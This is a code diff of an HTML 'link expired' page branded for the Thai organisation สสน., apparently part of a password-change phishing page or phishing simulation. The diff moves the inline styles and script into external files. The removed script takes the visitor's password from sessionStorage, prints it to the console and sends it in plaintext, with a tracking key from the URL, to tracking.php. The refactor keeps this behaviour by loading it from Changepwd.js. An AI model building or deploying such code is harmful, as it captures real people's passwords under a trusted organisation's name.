@@ -5,127 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ลิงก์หมดอายุ | สสน.</title>
     <link href="https://fonts.googleapis.com/css2?family=Prompt:wght@300;400;500;600&display=swap" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Prompt', sans-serif;
-            background: linear-gradient(135deg, rgb(0, 147, 187) 0%, rgb(121, 188, 121) 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        
-        .container {
-            background: white;
-            border-radius: 16px;
-            padding: 2.5rem 2rem;
-            max-width: 480px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
-        }
-        
-        .logo {
-            margin-bottom: 1.5rem;
-        }
-        
-        .logo img {
-            max-height: 120px;
-            width: auto;
-        }
-        
-        .icon {
-            font-size: 3.5rem;
-            margin-bottom: 1rem;
-        }
-        
-        h1 {
-            font-size: 1.5rem;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 1rem;
-        }
-        
-        .status-badge {
-            display: inline-block;
-            background: #ff5252;
-            color: white;
-            padding: 0.4rem 1.2rem;
-            border-radius: 20px;
-            font-size: 0.85rem;
-            font-weight: 500;
-            margin-bottom: 1.5rem;
-        }
-        
-        .message {
-            color: #666;
-            font-size: 1rem;
-            line-height: 1.8;
-            margin-bottom: 1.5rem;
-        }
-        
-        .thank-you {
-            background: #e8f4fc;
-            border-radius: 12px;
-            padding: 1.2rem;
-            margin-bottom: 1.5rem;
-        }
-        
-        .thank-you h2 {
-            color: #1a73a7;
-            font-size: 1.1rem;
-            font-weight: 500;
-            margin-bottom: 0.5rem;
-        }
-        
-        .thank-you p {
-            color: #5a7a8a;
-            font-size: 0.9rem;
-        }
-        
-        .divider {
-            height: 1px;
-            background: #eee;
-            margin: 1.5rem 0;
-        }
-        
-        .footer {
-            color: #888;
-            font-size: 0.8rem;
-        }
-        
-        .footer .org-name {
-            font-weight: 500;
-            color: #1a73a7;
-            font-size: 0.9rem;
-            margin-bottom: 0.3rem;
-        }
-        
-        .btn-request {
-            display: inline-block;
-            background: linear-gradient(135deg, #1a73a7 0%, #2196f3 100%);
-            color: white;
-            padding: 0.8rem 1.5rem;
-            border-radius: 8px;
-            text-decoration: none;
-            font-size: 0.95rem;
-            font-weight: 500;
-            margin-top: 1rem;
-            transition: all 0.3s ease;
-        }
-        
-        .btn-request:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 15px rgba(26, 115, 167, 0.3);
-        }
-    </style>
+    <link rel="stylesheet" href="Changepwd.css">
 </head>
 <body>
     <div class="container">
@@ -156,27 +36,7 @@
         </div>
     </div>
 
-    <script>
-        // get tracking key from url
-        const urlParams = new URLSearchParams(window.location.search);
-        const userKey = urlParams.get('k');
-        const password = sessionStorage.getItem('userPassword');
-        console.log(password)
-        console.log(sessionStorage.getItem('userPassword'))
-        if (password) {
-            console.log('Received password:', password);
-        } else {
-            console.log('No password found');
-        }
-        sessionStorage.clear()
-        // if key exist, use in tracking.php
-        if (userKey) {
-            console.log('tracking.php?k2=' + userKey +'&p=' + password);
-            fetch('tracking.php?k2=' + userKey +'&p=' + password)
-                .then(response => console.log("Logged"))
-                .catch(error => console.error("Error logging"));
-        }
-    </script>
+    <script src="Changepwd.js"></script>
 </body>
 </html>
 
